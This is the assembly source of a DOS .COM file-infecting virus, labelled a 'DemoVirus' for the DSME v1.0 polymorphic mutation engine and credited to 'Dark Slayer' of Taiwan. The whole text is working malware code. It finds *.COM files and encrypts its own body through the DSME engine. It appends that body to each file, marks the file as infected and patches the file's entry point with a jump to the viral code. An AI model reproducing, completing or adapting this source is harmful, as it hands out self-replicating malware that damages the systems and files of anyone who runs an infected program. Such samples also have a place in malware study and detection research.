

; * The DemoVirus (for DSME v1.0) *
; * has written by Dark Slayer    *
; * in Keelung,Taiwan             *

DEMOVIR SEGMENT
        ASSUME  CS:DEMOVIR,DS:DEMOVIR
        EXTRN   DSME:NEAR,DSME_END:NEAR
        ORG     0
START:
        CALL    GET_ADDR
GET_ADDR:
        JMP     SHORT BEGIN

MSG     DB      ' This is a DemoVirus for DSME v1.0, '
        DB      'Written by Dark Slayer in Keelung,Taiwan '

BEGIN:
        POP     SI
        SUB     SI,OFFSET GET_ADDR
        MOV     DI,SI
        AND     DI,0FFF0h
        MOV     AX,DI
        MOV     CL,4
        SHR     AX,CL
        MOV     CX,CS
        ADD     AX,CX
        PUSH    AX
        MOV     AX,OFFSET RETF_TO
        PUSH    AX
        MOV     CX,OFFSET DSME_END
        CLD
        REP     MOVSB
        RETF
RETF_TO:
        PUSH    CS
        POP     DS
        MOV     SI,OFFSET HEAD_DAT
        XOR     DI,DI
        CMP     BYTE PTR CS:HEAD_DAT,0
        JE      FIRST
        MOV     DI,0100h
        PUSH    DI
        MOVSW
        MOVSW
        POP     DI
FIRST:
        PUSH    ES
        PUSH    DI
        PUSH    ES
        MOV     AH,1Ah
        MOV     DX,OFFSET DTA_BUF
        INT     21h
        MOV     SI,3
        MOV     AH,4Eh
        MOV     CX,3
        MOV     DX,OFFSET FIND_NAME
        INT     21h
        JNC     TO_INFECT
        JMP     SHORT FIND_END
FIND_LOOP:
        MOV     AH,4Fh
        INT     21h
        JC      FIND_END
TO_INFECT:
        CALL    INFECT
        DEC     SI
        JNZ     FIND_LOOP
FIND_END:
        POP     ES
        PUSH    ES
        POP     DS
        MOV     DX,80h
        MOV     AH,1Ah
        INT     21h
        RETF

INFECT  PROC
        MOV     DX,OFFSET DTA_BUF+1Eh
        MOV     AX,3D02h
        INT     21h
        XCHG    BX,AX
        MOV     AH,3Fh
        MOV     CX,4
        MOV     DX,OFFSET HEAD_DAT
        INT     21h
        INC     SI
        CMP     BYTE PTR DS:HEAD_DAT,0AEh
        JE      CLOSE_FILE

        DEC     SI
        XOR     CX,CX
        XOR     DX,DX
        MOV     AX,4202h
        INT     21h
        MOV     BP,AX
        SUB     AX,4
        MOV     DS:JMP_ADDR,AX
        ADD     BP,100h

        MOV     AX,OFFSET DSME_END+0Fh
        MOV     CL,4
        SHR     AX,CL
        MOV     CX,CS
        ADD     AX,CX
        MOV     ES,AX
        MOV     CX,OFFSET DSME_END

        PUSH    BX
        MOV     BL,0
        CALL    DSME
        POP     BX
        MOV     AH,40h
        INT     21h

        PUSH    CS
        POP     DS
        XOR     CX,CX
        XOR     DX,DX
        MOV     AX,4200h
        INT     21h
        MOV     AH,40h
        MOV     CX,4
        MOV     DX,OFFSET WRT_DAT
        INT     21h
CLOSE_FILE:
        MOV     AH,3Eh
        INT     21h
        RET
INFECT  ENDP

WRT_DAT DB      0AEh,         0E9h
              ; ^^^^          ^^^^
              ; SCASB(Mark)   JMP XXXX

JMP_ADDR DW     ?

HEAD_DAT DB     4 DUP(?)
FIND_NAME DB    '*.COM',0
DTA_BUF DB      30h DUP(?)

DEMOVIR ENDS
        END     START

